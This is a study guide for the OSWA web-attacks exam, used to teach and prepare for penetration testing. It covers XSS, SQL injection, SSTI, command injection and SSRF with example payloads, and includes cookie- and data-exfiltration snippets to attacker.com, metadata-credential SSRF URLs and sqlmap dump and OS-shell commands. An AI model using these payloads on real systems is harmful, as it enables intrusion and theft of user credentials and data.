# Web Attacks Study Guide - OSWA (WEB-200)

## Cross-Site Scripting (XSS)

**📚 [Detailed XSS Guide →](documentation/01-XSS-Detailed.md)**

### Reflected Server XSS
**Type**: Non-persistent, server-side rendered

**Description**: Malicious script is injected via request parameters (URL, forms) and immediately reflected back in the server's response without proper sanitization. The payload is NOT stored on the server.

**Key Characteristics**:
- Requires victim to click malicious link or submit crafted form
- Payload executes immediately upon page load
- Server-side rendering includes unsanitized user input directly in HTML response
- Common in search results, error messages, and form validation responses

**Example Scenario**:
```
https://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>
```
Server responds with: `Results for: <script>alert(document.cookie)</script>`

**Scanning Tools**:
- **XSStrike**: `xsstrike -u "https://target.com/search?q=test"`
- **Dalfox**: `dalfox url https://target.com/search?q=FUZZ`
  - `dalfox file urls.txt` - Scan multiple URLs from file
  - `dalfox url [URL] --blind https://your-collab-server.com` - Blind XSS testing
- **Burp Suite Scanner**: Professional edition auto-scan feature
- **OWASP ZAP**: `zap-cli active-scan https://target.com`

---

### Stored Server XSS
**Type**: Persistent, server-side rendered

**Description**: Malicious script is stored in the application's database (comments, profiles, messages) and served to users when they view the affected page. More dangerous than reflected XSS due to persistence.

**Key Characteristics**:
- Payload persists in database/storage
- Affects multiple users who view the infected content
- No user interaction required beyond visiting the page
- Common in comment sections, user profiles, forum posts

**Example Scenario**:
User submits comment: `<script>fetch('https://attacker.com?c='+document.cookie)</script>`
Every visitor to that page executes the payload.

**Scanning Tools**:
- **XSStrike**: `xsstrike -u "https://target.com/comment" --data "comment=test"`
- **Dalfox**: `dalfox url https://target.com/submit --data "comment=FUZZ" --method POST`
- **XSSHunter**: Cloud-based platform for stored XSS detection (blind payloads)
- **Burp Suite Collaborator**: Use with Intruder for blind stored XSS
  - Set payload: `<script src="https://BURP-COLLABORATOR-SUBDOMAIN"></script>`

---

### Reflected Client XSS (DOM-based)
**Type**: Non-persistent, client-side execution

**Description**: Vulnerability exists entirely in client-side JavaScript code. Payload is reflected through DOM manipulation without server involvement. The server response never contains the malicious script.

**Key Characteristics**:
- Exploits unsafe JavaScript practices (innerHTML, eval, document.write)
- Payload never sent to server or appears in HTTP response
- Source: URL fragments (#), query parameters processed by JS
- Harder to detect with traditional WAFs

**Example Scenario**:
```javascript
// Vulnerable code
var name = window.location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;

// Attack URL
https://site.com/page#<img src=x onerror=alert(1)>
```

**Scanning Tools**:
- **DOM Invader** (Burp Suite extension): Browser-based DOM XSS detection
- **Dalfox**: `dalfox url "https://target.com/page#FUZZ" --mining-dom`
  - `--mining-dom-depth 3` - Increase DOM analysis depth
- **Manual Browser DevTools**: Inspect JavaScript source and data flow
- **Retire.js**: `retire --js --jspath ./` - Detect vulnerable JS libraries

---

### Stored Client XSS (DOM-based)
**Type**: Persistent, client-side execution

**Description**: Malicious payload is stored (localStorage, IndexedDB, cookies) and later retrieved and unsafely processed by client-side JavaScript, causing code execution.

**Key Characteristics**:
- Combines persistence with DOM-based execution
- Data stored client-side but exploited through unsafe DOM manipulation
- Can persist across sessions
- Often exploits Web Storage APIs

**Example Scenario**:
```javascript
// Store malicious data
localStorage.setItem('username', '<img src=x onerror=alert(1)>');

// Later, unsafe retrieval
document.getElementById('user').innerHTML = localStorage.getItem('username');
```

**Scanning Tools**:
- **DOM Invader** (Burp Suite): Detect Web Storage sinks
- **Manual Testing**: Browser DevTools Console
  - `localStorage.setItem('key', '<img src=x onerror=alert(1)>')` - Test storage
  - `console.log(localStorage)` - Inspect stored data
- **XSS Hunter**: For persistent blind XSS tracking

---

## Cross-Origin Attacks

**📚 [Detailed Cross-Origin Attacks Guide →](documentation/02-Cross-Origin-Attacks-Detailed.md)**

**Description**: Exploitation of the Same-Origin Policy (SOP) or its relaxation mechanisms (CORS). Attackers attempt to make unauthorized cross-origin requests or read cross-origin data.

**Key Attack Vectors**:

1. **CORS Misconfiguration**:
   - Wildcard origins or reflected Origin header
   - Allows credential-bearing cross-origin requests

2. **CSRF (Cross-Site Request Forgery)**:
   - Forces authenticated users to execute unwanted actions
   - Exploits browser's automatic cookie inclusion

3. **Clickjacking**:
   - Invisible iframe overlay tricks users into clicking malicious content

**Example CORS Attack**:
```javascript
// Attacker's site
fetch('https://api.vulnerable.com/user/data', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/log?data=' + JSON.stringify(data)));
```

**Scanning Tools**:
- **CORScanner**: `python cors_scan.py -u https://target.com`
  - `-i urls.txt` - Scan multiple URLs
  - `-t 10` - Set thread count
- **Burp Suite**: Manual testing with Origin header manipulation
  - Repeater: Change `Origin: https://evil.com`
- **OWASP ZAP**: Passive scanner detects CORS misconfigurations
- **curl**: `curl -H "Origin: https://evil.com" -I https://target.com/api`
- **CSRFtester**: GUI tool for CSRF testing
- **Burp CSRF PoC Generator**: Right-click request → Engagement tools → Generate CSRF PoC

---

## SQL Injection

**📚 [Detailed SQL Injection Guide →](documentation/03-SQL-Injection-Detailed.md)**

**Description**: Injection of malicious SQL code into application queries through unsanitized user input, allowing attackers to manipulate database operations.

**Key Characteristics**:
- Bypasses authentication mechanisms
- Extracts, modifies, or deletes database data
- Can lead to complete database compromise
- Exploits lack of parameterized queries/prepared statements

**Common Techniques**:
- **Union-based**: Combine malicious query with legitimate one
- **Boolean-based blind**: Infer data through true/false responses
- **Time-based blind**: Use SQL delays to extract data
- **Stacked queries**: Execute multiple statements

**Example**:
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$input' AND password = '$pass'

-- Injection payload
' OR '1'='1' --

-- Resulting query
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
```

**Scanning Tools**:
- **SQLMap**: The industry standard for SQL injection
  - `sqlmap -u "https://target.com/page?id=1"` - Basic scan
  - `sqlmap -u [URL] --dbs` - Enumerate databases
  - `sqlmap -u [URL] -D dbname --tables` - Enumerate tables
  - `sqlmap -u [URL] -D dbname -T users --columns` - Enumerate columns
  - `sqlmap -u [URL] -D dbname -T users --dump` - Dump table data
  - `sqlmap -r request.txt` - Use saved Burp request
  - `sqlmap -u [URL] --batch --risk=3 --level=5` - Aggressive scan
  - `sqlmap -u [URL] --os-shell` - Attempt OS shell
- **NoSQLMap**: `python nosqlmap.py -t https://target.com -p param`
- **Burp Suite Scanner**: Automated SQL injection detection
- **Ghauri**: `ghauri -u "https://target.com/page?id=1" --dbs` - SQLMap alternative
- **jSQL Injection**: GUI-based SQL injection tool

---

## Directory Traversal Attacks

**📚 [Detailed Directory Traversal Guide →](documentation/04-Directory-Traversal-Detailed.md)**

**Description**: Exploitation of insufficient input validation to access files and directories outside the intended web root directory, often using path traversal sequences.

**Key Characteristics**:
- Uses `../` or `..\` sequences to navigate file system
- Can expose sensitive files (/etc/passwd, web.config, .env)
- Bypasses application access controls
- Also known as Path Traversal

**Common Techniques**:
- Basic: `../../../../etc/passwd`
- URL encoding: `..%2F..%2F..%2Fetc%2Fpasswd`
- Double encoding: `..%252F..%252F`
- Null byte injection: `../../../../etc/passwd%00.jpg`

**Example**:
```
https://vulnerable-site.com/download?file=../../../../etc/passwd
https://vulnerable-site.com/image?name=../../web.config
```

**Scanning Tools**:
- **DotDotPwn**: `dotdotpwn -m http -h target.com -x 80 -f /etc/passwd`
  - `-d 8` - Traversal depth
  - `-k admin` - Specific directory to search for
- **ffuf**: `ffuf -u https://target.com/download?file=FUZZ -w traversal-wordlist.txt`
  - `-w /path/to/LFI-wordlist.txt` - Use custom wordlist
  - `-mc 200` - Match HTTP 200 responses
- **Burp Suite Intruder**:
  - Use payload list from `/usr/share/wordlists/seclists/Fuzzing/LFI/`
- **LFISuite**: `python lfisuite.py -u https://target.com/page?file=test`
- **Kadimus**: `kadimus -u "https://target.com/file?path=test"`
  - `--technique=data://` - Test data wrapper

---

## XML External Entities (XXE)

**📚 [Detailed XXE Guide →](documentation/05-XXE-Detailed.md)**

**Description**: Attack exploiting XML parsers that process external entity references, allowing attackers to access local files, perform SSRF, or cause DoS.

**Key Characteristics**:
- Exploits misconfigured XML parsers with DTD processing enabled
- Can read local files, scan internal networks, execute code (rare)
- Often found in file upload features, API endpoints accepting XML
- Can be blind (no direct output) or in-band

**Attack Types**:
1. **Classic XXE**: Direct file disclosure
2. **Blind XXE**: OOB data exfiltration via DTD
3. **SSRF via XXE**: Scan internal network

**Example**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userInfo>
  <name>&xxe;</name>
</userInfo>
```

**Scanning Tools**:
- **XXEinjector**: `ruby XXEinjector.rb --host=192.168.1.10 --path=/etc/passwd --file=request.xml`
  - `--oob=http` - Out-of-band HTTP exfiltration
  - `--phpfilter` - Use PHP filter for base64 encoding
  - `--enumports=21,22,80,443` - Port enumeration
- **Burp Suite**: Manual testing with Repeater
  - Use Collaborator for OOB detection
- **OWASP ZAP**: Active scanner includes XXE checks
- **xmlrpc**: `python -m xmlrpc.server` - Test XMLRPC endpoints
- **Nuclei**: `nuclei -u https://target.com -t xxe/`
  - Uses template-based scanning

---

## Server-Side Template Injection (SSTI)

**📚 [Detailed SSTI Guide →](documentation/06-SSTI-Detailed.md)**

**Description**: Injection of malicious template directives into template engines, allowing attackers to execute arbitrary code on the server.

**Key Characteristics**:
- Exploits unsafe template rendering with user input
- Can lead to Remote Code Execution (RCE)
- Different payloads for different engines (Jinja2, Twig, FreeMarker, etc.)
- Often found in templating features, custom pages, email templates

**Detection**:
Test with mathematical expressions: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`

**Example (Jinja2)**:
```python
# Vulnerable code
template = Template("Hello " + user_input)

# Payload
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Or simpler
{{7*7}}  # Returns 49 if vulnerable
```

**Scanning Tools**:
- **tplmap**: `python tplmap.py -u 'https://target.com/page?name=test'`
  - `--os-shell` - Attempt to get interactive shell
  - `--tpl-shell` - Get template shell
  - `-e Jinja2` - Specify template engine
- **SSTImap**: `python sstimap.py -u https://target.com/page?name=test`
  - `-s` - Smart mode (auto-detect engine)
  - `--os-cmd "id"` - Execute OS command
- **Burp Suite Intruder**: Use SSTI payload lists
  - Test with: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- **Nuclei**: `nuclei -u https://target.com -t ssti/`
- **Manual Testing**:
  - Template expression payloads: `{{7*7}}[[7*7]]${7*7}<%= 7*7 %>`

---

## Command Injection

**📚 [Detailed Command Injection Guide →](documentation/07-Command-Injection-Detailed.md)**

**Description**: Execution of arbitrary operating system commands on the server by injecting malicious input into application functions that execute shell commands.

**Key Characteristics**:
- Exploits insufficient input sanitization in system calls
- Leads to full system compromise
- Uses shell metacharacters (`;`, `|`, `&`, `&&`, `||`, `` ` ``, `$()`)
- Common in ping, whois, DNS lookup features

**Injection Operators**:
- `;` - Command separator
- `|` - Pipe output
- `&&` - Execute if previous succeeds
- `||` - Execute if previous fails
- `` `cmd` `` or `$(cmd)` - Command substitution

**Example**:
```bash
# Vulnerable application
system("ping -c 4 " + user_input)

# Injection payload
8.8.8.8; cat /etc/passwd

# Resulting command
ping -c 4 8.8.8.8; cat /etc/passwd
```

**Scanning Tools**:
- **commix**: `python commix.py --url="https://target.com/ping?ip=127.0.0.1"`
  - `--data="ip=127.0.0.1"` - POST data injection
  - `--os-shell` - Pseudo-terminal shell
  - `--technique=t` - Time-based technique
  - `--level=3` - Test level (1-3)
  - `-p ip` - Specify parameter to test
- **Burp Suite Intruder**: Use command injection wordlist
  - Payloads: `; id`, `| whoami`, `&& cat /etc/passwd`
- **OWASP ZAP**: Active scanner command injection checks
- **Nuclei**: `nuclei -u https://target.com -t cves/ -t vulnerabilities/`
- **Manual Testing with curl**:
  - `curl "https://target.com/ping?ip=127.0.0.1;id"`

---

## Server-Side Request Forgery (SSRF)

**📚 [Detailed SSRF Guide →](documentation/08-SSRF-Detailed.md)**

**Description**: Attacker induces the server to make HTTP requests to arbitrary domains, often targeting internal resources not accessible from the internet.

**Key Characteristics**:
- Exploits features that fetch remote resources (webhooks, URL imports, PDF generators)
- Bypasses firewalls and network segmentation
- Can access internal services (metadata endpoints, admin panels, databases)
- Cloud metadata exploitation (AWS: 169.254.169.254)

**Attack Targets**:
- Internal services (localhost, 127.0.0.1, 192.168.x.x, 10.x.x.x)
- Cloud metadata APIs
- Internal network scanning
- Protocol smuggling (file://, gopher://, dict://)

**Example**:
```
# Application feature
POST /api/fetch-url
{"url": "https://external-site.com/image.jpg"}

# SSRF payload
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"url": "http://localhost/admin"}
{"url": "file:///etc/passwd"}
```

**Scanning Tools**:
- **SSRFmap**: `python ssrfmap.py -r request.txt -p url`
  - `-m readfiles` - File reading module
  - `-m portscan` - Port scanning module
  - `-l localhost` - Target localhost
- **Gopherus**: `gopherus --exploit mysql` - Generate Gopher payloads
  - Supports: MySQL, PostgreSQL, FastCGI, Redis, SMTP
- **Burp Suite Collaborator**: Detect blind SSRF
  - Payload: `https://BURP-COLLABORATOR-SUBDOMAIN`
- **Interactsh**: `interactsh-client` - Open-source Collaborator alternative
- **ffuf**: `ffuf -u https://target.com/fetch?url=http://127.0.0.1:FUZZ -w ports.txt`
- **SSRFDetector** (Burp extension): Automated SSRF detection
- **Manual Testing**:
  - `curl -X POST -d '{"url":"http://169.254.169.254/latest/meta-data/"}' https://target.com/api`

---

## Insecure Direct Object Reference (IDOR)

**📚 [Detailed IDOR Guide →](documentation/09-IDOR-Detailed.md)**

**Description**: Access control vulnerability where users can access objects (files, database records, resources) belonging to other users by manipulating reference identifiers.

**Key Characteristics**:
- Missing or weak authorization checks
- Predictable object identifiers (sequential IDs, usernames)
- Horizontal privilege escalation (access other users' data)
- Vertical privilege escalation (access admin functions)

**Common Locations**:
- URL parameters: `/user/profile?id=1234`
- API endpoints: `/api/order/5678`
- File downloads: `/download?file=invoice_123.pdf`
- Hidden form fields

**Example**:
```
# Legitimate request
GET /api/user/documents?userId=1001
Response: [user 1001's documents]

# IDOR attack
GET /api/user/documents?userId=1002
Response: [user 1002's documents] <- Should be forbidden

# Prevention requires proper authorization check:
if (session.userId != requestedUserId && !session.isAdmin) {
  return 403 Forbidden
}
```

**Scanning Tools**:
- **Autorize** (Burp Suite extension): Automated authorization testing
  - Set low-privileged user session
  - Replay requests from high-privileged user
- **Burp Suite Intruder**: Numeric ID enumeration
  - Payload type: Numbers (sequential 1-10000)
  - Grep-Match: Success indicators
- **AuthMatrix** (Burp extension): Role-based access testing
- **wfuzz**: `wfuzz -z range,1-1000 https://target.com/api/user/FUZZ`
  - `--hc 404,403` - Hide 404/403 responses
- **ffuf**: `ffuf -u https://target.com/download?file=invoice_FUZZ.pdf -w ids.txt`
- **IDOR-detector**: `python idor-detector.py -u https://target.com/api/`
- **Manual Testing**:
  - Create two user accounts (low/high privilege)
  - Intercept requests and swap IDs/tokens
  - Compare responses for unauthorized access

---

## File Upload Vulnerabilities

**📚 [Detailed File Upload Guide →](documentation/10-File-Upload-Detailed.md)**

**Description**: Vulnerabilities that allow attackers to upload malicious files leading to remote code execution, XSS, or XXE.

**Common Attack Vectors**:
- PHP web shells
- SVG with XSS/XXE
- Double extensions
- MIME type bypass
- Magic byte manipulation
- Path traversal in filename

**Scanning Tools**:
- **Fuxploider**: `python3 fuxploider.py --url https://target.com/upload`
- **Burp Suite**: Upload Scanner extension
- **Manual testing**: Extension bypass, content-type manipulation

---

## Authentication & Session Attacks

**📚 [Detailed Authentication Attacks Guide →](documentation/11-Authentication-Attacks-Detailed.md)**

**Description**: Attacks targeting authentication mechanisms, session management, password reset flows, and multi-factor authentication.

**Key Attack Types**:
- SQL injection in login
- NoSQL injection bypass
- Username enumeration
- Password brute force
- Session fixation
- JWT attacks (none algorithm, weak secret)
- OAuth misconfigurations
- MFA bypass

**Scanning Tools**:
- **Hydra**: Password brute forcing
- **JWT_Tool**: `python3 jwt_tool.py <JWT> -M at`
- **Burp Suite**: JWT Editor extension, Autorize extension

---

## HTTP Request Smuggling

**📚 [Detailed HTTP Request Smuggling Guide →](documentation/12-HTTP-Request-Smuggling-Detailed.md)**

**Description**: Advanced attack exploiting discrepancies in HTTP parsing between front-end and back-end servers.

**Attack Variants**:
- CL.TE (Content-Length → Transfer-Encoding)
- TE.CL (Transfer-Encoding → Content-Length)
- TE.TE (Transfer-Encoding obfuscation)
- HTTP/2 smuggling

**Scanning Tools**:
- **HTTP Request Smuggler** (Burp Extension)
- **smuggler.py**: `python3 smuggler.py -u https://target.com/`
- **h2csmuggler**: For HTTP/2 testing

---

## API Security Testing

**📚 [Detailed API Security Guide →](documentation/13-API-Security-Testing-Detailed.md)**

**Description**: Testing REST APIs, GraphQL, and WebSocket implementations for security vulnerabilities.

**Key Testing Areas**:
- API endpoint discovery
- Authentication & authorization (BOLA/IDOR)
- Mass assignment
- Excessive data exposure
- Rate limiting
- GraphQL introspection & injection
- WebSocket hijacking

**Scanning Tools**:
- **Postman**: API testing and automation
- **Arjun**: `python3 arjun.py -u https://target.com/api/users`
- **GraphQL Cop**: `graphql-cop -t https://target.com/graphql`
- **InQL Scanner** (Burp Extension)

---

## Quick Reference Materials

### Essential Documents
- **[Quick Reference Cheat Sheet](quick-reference-cheatsheet.md)** - One-page reference for all vulnerabilities
- **[Master Payload Reference](master-payload-reference.md)** - Comprehensive payload library
- **[Tool Installation Guide](tool-installation-guide.md)** - Complete setup instructions
- **[Exam Day Checklist](exam-day-checklist.md)** - Time management and preparation

### Helper Scripts
Located in `/scripts` directory:
- **idor_tester.py** - Automated IDOR enumeration
- **sqli_tester.py** - Quick SQL injection detection
- **xss_tester.py** - XSS vulnerability scanner

**Usage**:
```bash
python3 scripts/idor_tester.py -u "https://target.com/api?id=1" -p id -s 1 -e 100
python3 scripts/sqli_tester.py -u https://target.com/page -p id
python3 scripts/xss_tester.py -u https://target.com/search -p q
```

---

## Study Tips

1. **Practice Environment**: Use DVWA, bWAPP, PortSwigger Academy, or HackTheBox
2. **Burp Suite**: Master intercepting and modifying requests
3. **Payloads**: Use the master-payload-reference.md for quick access
4. **Chaining**: Understand how to chain vulnerabilities for greater impact
5. **Documentation**: Keep detailed notes of successful exploitation techniques
6. **Time Management**: Review exam-day-checklist.md for optimal time allocation
7. **Tool Proficiency**: Install and test all tools before exam day
8. **Quick Reference**: Print quick-reference-cheatsheet.md for exam day

## Key Mitigation Principles

- **Input Validation**: Whitelist approach, strict type checking
- **Output Encoding**: Context-aware encoding (HTML, JS, URL, SQL)
- **Parameterized Queries**: Never concatenate user input into queries
- **Least Privilege**: Minimize permissions and access
- **Security Headers**: CSP, X-Frame-Options, CORS policies
- **Web Application Firewalls**: Defense in depth, not sole protection
- **Authentication**: Strong password hashing, MFA, session management
- **File Upload**: Whitelist extensions, content validation, sandboxing
- **API Security**: Rate limiting, authorization checks, input validation

---

## Additional Practice Resources

### Online Labs
- **PortSwigger Academy**: https://portswigger.net/web-security
- **HackTheBox**: https://hackthebox.com
- **TryHackMe**: https://tryhackme.com
- **PentesterLab**: https://pentesterlab.com
- **OWASP WebGoat**: https://owasp.org/www-project-webgoat/

### Vulnerable Applications
- **DVWA** (Damn Vulnerable Web Application)
- **bWAPP** (Buggy Web Application)
- **OWASP Juice Shop**
- **WebGoat**
- **Mutillidae**

---

**Good luck with your OSWA studies!**
